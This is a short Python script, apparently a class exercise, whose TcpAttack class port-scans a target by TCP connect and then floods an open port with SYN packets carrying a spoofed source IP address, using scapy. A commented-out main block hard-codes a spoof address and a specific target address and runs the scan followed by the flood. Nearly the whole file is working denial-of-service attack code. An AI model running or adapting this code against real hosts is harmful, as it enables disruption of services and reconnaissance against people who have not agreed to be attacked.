#/bin/sh


import socket
from scapy.all import *
from scapy.layers.inet import TCP, IP

class TcpAttack:
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP
        self.open_ports = []
    def scanTarget(self,rangeStart,rangeEnd):
        for testport in range(rangeStart, rangeEnd + 1):
            print(testport)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            try:
                sock.connect((self.targetIP, testport))
                self.open_ports.append(testport)
            except:
                pass
        print(self.open_ports)
        with open("openports.txt", "w") as fp:
            for testport in self.open_ports:
                fp.write(str(testport) + '\n')

    def attackTarget(self, port, numSyn):
        if port not in self.open_ports:
            return 0
        for i in range(numSyn):
            IP_header = IP(src=self.spoofIP, dst=self.targetIP)
            TCP_header = TCP(flags="S", sport=RandShort(), dport=port)
            packet = IP_header / TCP_header
            try:
                send(packet)
            except Exception as e:
                print(e)
        return 1
'''
if __name__ == '__main__':

    spoofIP = '192.168.4.22'
    targetIP = '128.46.4.61'
    rangeStart = 0
    rangeEnd = 30
    Tcp = TcpAttack(spoofIP, targetIP)
    Tcp.scanTarget(rangeStart, rangeEnd)
    print(Tcp.open_ports[0])
    if Tcp.attackTarget(Tcp.open_ports[0], 10):
        print('port was open to attack')       
'''         
